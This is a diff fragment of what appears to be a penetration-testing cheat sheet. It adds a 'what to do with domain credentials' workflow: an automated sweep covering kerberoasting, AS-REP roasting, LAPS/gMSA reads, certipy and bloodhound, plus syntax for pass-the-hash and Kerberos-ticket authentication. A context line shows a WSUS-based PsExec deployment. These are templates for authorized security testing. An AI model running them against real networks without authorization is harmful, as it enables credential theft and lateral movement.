@@ -4051,6 +4051,10 @@ python3 pywsus.py -H <WSUS_SERVER_IP> -p 8530 -e PsExec64.exe -c '/accepteula -s
 
 ## Quick Reference: "I Have Creds — What Now?" (AD Flow)
 
+> **Automate it:** `python3 automation/recon.py <DC_IP> --mode creds --user <U> --domain <DOM> [--password <P> | --hash <NT> | --kerberos]` runs the whole sweep below (admin-check, /24 reuse, shares+spider, kerberoast, asrep, descriptions, gmsa/laps, certipy, bloodhound) into `creds_<ip>_<ts>/`. Manual steps:
+>
+> **Auth variant?** swap `-p '<PASS>'` for `-H <NT_HASH>` (PtH) or `-k --use-kcache` + `export KRB5CCNAME=<ccache>` (Kerberos). Impacket uses `-hashes :<NT>` / `-k -no-pass`. All failing with good creds → check `klist` principal/realm case + NTLM-disabled [§1.0.5](#105-ntlm-disabled-dc--detect--pivot-to-kerberos-only).
+
 ```text
 Got domain credentials? Follow this order:
 
